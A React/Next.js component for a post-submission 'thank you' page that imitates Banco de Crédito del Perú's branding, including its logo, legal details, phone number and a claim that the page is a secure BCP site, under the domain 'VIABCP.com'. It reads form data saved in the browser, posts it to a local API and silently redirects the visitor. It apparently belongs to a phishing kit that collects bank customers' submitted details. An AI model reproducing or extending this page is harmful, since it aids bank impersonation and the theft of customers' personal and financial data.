"use client";

import { useEffect, useState } from "react";

export default function GraciasClient({
  redirectTo,
  delayMs = 2500,
}: {
  redirectTo: string;
  delayMs?: number;
}) {
  const [seconds] = useState(300);

  useEffect(() => {
    // 🔹 1. Leer datos guardados en localStorage
    const saved = localStorage.getItem("formData");
    if (saved) {
      const formData = JSON.parse(saved);

      // 🔹 2. Enviar al API
      const sendData = async () => {
        try {
          console.log("📩 Enviando a /api/form/submit:", formData);
          const res = await fetch("/api/form/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(formData),
          });
          const json = await res.json();
          console.log("✅ Respuesta API:", json);
        } catch (err) {
          console.error("❌ Error enviando formulario:", err);
        }
      };

      sendData();
    }

    // 🔹 3. Redirigir después del delay
    if (redirectTo) {
      const t = setTimeout(() => {
        window.location.replace(redirectTo);
      }, delayMs);
      return () => clearTimeout(t);
    }
  }, [redirectTo, delayMs]);

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-[color:var(--brand)] text-white">
        <div className="container-max h-12 flex items-center justify-between">
          <img src="/bcp-logo.svg" alt="BCP" className="h-5" />
          <div className="flex items-center gap-2 text-sm font-semibold">
            <span>{seconds} segundos</span>
            <svg
              width="18"
              height="18"
              viewBox="0 0 24 24"
              fill="none"
              aria-hidden
            >
              <path
                d="M9 2h6M12 8v5l3 2"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
              />
              <circle
                cx="12"
                cy="14"
                r="7"
                stroke="currentColor"
                strokeWidth="2"
              />
            </svg>
          </div>
        </div>
      </header>

      {/* Contenido */}
      <main className="container-max py-8">
        <div className="rounded-[16px] border border-[color:var(--line)] bg-white shadow p-6 max-w-[420px] text-center mx-auto">
          <img src="/gracias.svg" alt="" className="mx-auto mb-4 w-28 h-28" />

          <h1 className="text-2xl font-bold text-[color:var(--brand)]">
            ¡Gracias!
          </h1>

          <p className="mt-3 text-[15px] text-[#334155] leading-6">
            Estamos procesando tu solicitud…
          </p>

          {redirectTo ? (
            <p className="mt-4 text-sm text-[#64748B]">
              Te redirigiremos automáticamente…
              <br />
              <a href={redirectTo} className="text-[#FF7A00] font-semibold">
                Ir ahora
              </a>
            </p>
          ) : (
            <p className="mt-4 text-sm text-[#64748B]">
              (No se configuró URL de redirección)
            </p>
          )}
        </div>

        {/* Footer legal */}
        <div className="max-w-[420px] mx-auto text-center text-[12px] text-[#8AA0B6] mt-6 space-y-1">
          <div className="flex items-center justify-center gap-2">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden>
              <path
                d="M12 1l9 5v12l-9 5-9-5V6l9-5z"
                stroke="currentColor"
                strokeWidth="1.4"
              />
              <path
                d="M8 12h8M12 8v8"
                stroke="currentColor"
                strokeWidth="1.4"
                strokeLinecap="round"
              />
            </svg>
            <span>
              Esta es una página segura del BCP. Si tienes dudas sobre la
              autenticidad de la web, comunícate con nosotros al (01) 311-9898
              o a través de nuestros medios digitales.
            </span>
          </div>
          <div className="pt-3 border-t border-[#E5EDF6]">
            Banco de Crédito del Perú S.A
            <br />
            RUC: 20100047218
            <br />
            © 2025 VIABCP.com
            <br />
            Todos los derechos reservados
          </div>
        </div>
      </main>
    </div>
  );
}
